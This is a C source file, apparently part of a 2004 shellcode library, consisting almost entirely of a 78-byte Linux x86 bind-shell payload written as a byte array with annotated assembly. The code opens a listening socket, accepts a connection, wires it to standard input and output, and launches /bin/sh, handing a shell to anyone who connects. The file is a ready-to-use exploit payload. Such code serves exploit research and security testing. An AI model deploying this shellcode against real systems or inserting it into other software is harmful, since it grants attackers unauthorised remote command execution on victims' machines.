/*
 *  lin-x86-bndsockcode.c
 *  Copyright 2004 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

#define BNDSOCKPORT 21

char bndsockcode[]=         /*  78 bytes                          */
    "\x31\xdb"              /*  xorl    %ebx,%ebx                 */
    "\xf7\xe3"              /*  mull    %ebx                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x43"                  /*  incl    %ebx                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x6a\x02"              /*  pushl   $0x02                     */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\xb0\x66"              /*  movb    $0x66,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x5b"                  /*  popl    %ebx                      */
    "\x5e"                  /*  popl    %esi                      */
    "\x52"                  /*  pushl   %edx                      */
    "\x68\xff\x02\x04\xd2"  /*  pushl   $0xd20402ff               */
    "\x6a\x10"              /*  pushl   $0x10                     */
    "\x51"                  /*  pushl   %ecx                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\x6a\x66"              /*  pushl   $0x66                     */
    "\x58"                  /*  popl    %eax                      */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x89\x41\x04"          /*  movl    %eax,0x04(%ecx)           */
    "\xb3\x04"              /*  movb    $0x04,%bl                 */
    "\xb0\x66"              /*  movb    $0x66,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x43"                  /*  incl    %ebx                      */
    "\xb0\x66"              /*  movb    $0x66,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x93"                  /*  xchgl   %eax,%ebx                 */
    "\x59"                  /*  popl    %ecx                      */
    "\x6a\x3f"              /*  pushl   $0x3f                     */
    "\x58"                  /*  popl    %eax                      */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x49"                  /*  decl    %ecx                      */
    "\x79\xf8"              /*  jns     <bndsockcode+50>          */
    "\x68\x2f\x2f\x73\x68"  /*  pushl   $0x68732f2f               */
    "\x68\x2f\x62\x69\x6e"  /*  pushl   $0x6e69622f               */
    "\x89\xe3"              /*  movl    %esp,%ebx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\xb0\x0b"              /*  movb    $0x0b,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
;

